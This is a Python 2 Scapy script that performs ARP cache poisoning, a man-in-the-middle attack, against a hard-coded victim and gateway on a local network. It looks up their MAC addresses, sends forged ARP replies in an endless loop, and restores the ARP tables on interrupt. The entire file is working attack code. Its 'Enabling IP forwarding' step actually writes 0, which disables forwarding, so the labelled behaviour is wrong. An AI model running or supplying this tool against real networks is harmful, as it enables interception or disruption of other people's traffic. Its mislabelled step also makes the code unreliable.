# Import the modules

from scapy.all import *
import sys
import os
import time

interface = 'eth0'
# Victim in this case is the initiator
victimIP = '192.168.1.177'
# Gateway in this case is the target
gateIP = '192.168.1.176'

print "\n [*] Enabling IP forwarding... \n"
os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

# Send an ARP request with the destination
def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP),
            timeout = 2, iface = interface, inter = 0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

# Re-assign the target's addresses so they know where to send their
# data properly
def reARP():
    print "\n[*] Restoring Targets..."
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
    print "[*] Disabling IP Forwarding..."
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print "[*] Shutting Down..."
    sys.exit(1)

# Sends a single ARP reply to each of the targets telling them that we are
# the other target, staying in the middle
def trick(gate, vic):
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = vic))
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = gate))

# Main man-in-the-middle function
def man_in_the_middle():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "[!] Couldn't Find Victim MAC Address"
        print "[!] Exiting..."
        sys.exit(1)
    try:
        gateMAC = get_mac(gateIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "[!] Couldn't Find Gateway MAC Address"
        print "[!] Exiting..."
        sys.exit(1)
    print "[*] Poisoning Targets..."
    while 1:
        try:
            trick(gateMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP()
            break

man_in_the_middle()
